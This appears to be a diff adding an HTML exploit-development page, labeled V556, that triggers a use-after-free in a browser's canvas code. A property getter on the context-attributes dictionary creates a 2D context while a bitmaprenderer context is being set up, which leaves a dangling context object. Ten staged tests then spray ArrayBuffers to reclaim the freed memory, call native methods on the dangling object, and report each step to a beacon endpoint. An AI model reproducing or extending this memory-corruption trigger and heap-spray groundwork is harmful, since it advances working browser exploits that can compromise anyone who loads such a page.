@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V556</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V556-'+tag+'?d='+encodeURIComponent(String(data).substring(0,400))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V556-ordered-isolation');
+
+// ============================================================
+// SAFE FIRST — build baseline data, then crash tests at end
+// ============================================================
+
+// T1: Normal canvas save — absolute baseline
+(function(){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var ctx=c.getContext('2d');
+  ctx.save();
+  b('T1','PASS normal-save lw='+ctx.lineWidth);
+})();
+
+// T2: Same-type alias — V550 proven approach
+(function(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  var outer2=document.createElement('canvas');
+  outer2.width=1;outer2.height=1;
+  var ctx2=outer2.getContext('2d');
+  innerCtx.save();
+  b('T2','PASS alias-save lw='+innerCtx.lineWidth);
+})();
+
+// T3: UAF + JS-only operations (no native binding calls)
+(function(){
+  var ctx=triggerUAF();
+  var s=ctx.toString();
+  var t=typeof ctx;
+  var c=ctx.constructor.name;
+  b('T3','PASS js-only str='+s+' type='+t+' ctor='+c);
+})();
+
+// T4: UAF + AB spray + JS-only operations
+(function(){
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++)abs.push(new ArrayBuffer(768));
+  var s=ctx.toString();
+  var t=typeof ctx;
+  b('T4','PASS spray-js-only str='+s+' type='+t);
+})();
+
+// T5: UAF + KEEP outer canvas alive + save
+// If the crash is because GC collected the outer canvas,
+// keeping it alive should prevent the crash.
+(function(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  // KEEP outer alive in this scope — prevents GC of canvas
+  // innerCtx is dangling wrapper, but outer canvas is still alive
+  b('T5-PRE','outer alive, about to save');
+  try{
+    innerCtx.save();
+    b('T5','PASS save-with-outer-alive');
+  }catch(e){b('T5-ERR',e.message)}
+  // Prevent outer from being optimized away
+  if(outer.width<0) log('impossible');
+})();
+
+// T6: UAF + save immediately, NO beacons between
+// (outer canvas goes out of scope from triggerUAF)
+(function(){
+  var ctx=triggerUAF();
+  // ONE beacon to confirm UAF succeeded
+  b('T6-UAF','ok');
+  // Now save — with beacon between UAF and save
+  try{
+    ctx.save();
+    b('T6','PASS uaf-save-with-beacon');
+  }catch(e){b('T6-ERR',e.message)}
+})();
+
+// T7: UAF + save, NO beacons at all between triggerUAF and save
+(function(){
+  var ctx=triggerUAF();
+  try{
+    ctx.save();
+    b('T7','PASS uaf-save-no-beacon');
+  }catch(e){b('T7-ERR',e.message)}
+})();
+
+// T8: UAF + AB spray + save, NO beacons between
+(function(){
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++)abs.push(new ArrayBuffer(768));
+  try{
+    ctx.save();
+    b('T8','PASS uaf-spray-save-no-beacon');
+  }catch(e){b('T8-ERR',e.message)}
+})();
+
+// T9: UAF + getContextAttributes (another native call)
+(function(){
+  var ctx=triggerUAF();
+  b('T9-PRE','about to getContextAttributes');
+  try{
+    var a=ctx.getContextAttributes();
+    b('T9','PASS attrs='+JSON.stringify(a));
+  }catch(e){b('T9-ERR',e.message)}
+})();
+
+// T10: UAF + lineWidth (accesses m_stateStack)
+(function(){
+  var ctx=triggerUAF();
+  b('T10-PRE','about to read lineWidth');
+  try{
+    var lw=ctx.lineWidth;
+    b('T10','PASS lineWidth='+lw);
+  }catch(e){b('T10-ERR',e.message)}
+})();
+
+b('DONE','V556-all-complete');
+</script>
+</body></html>
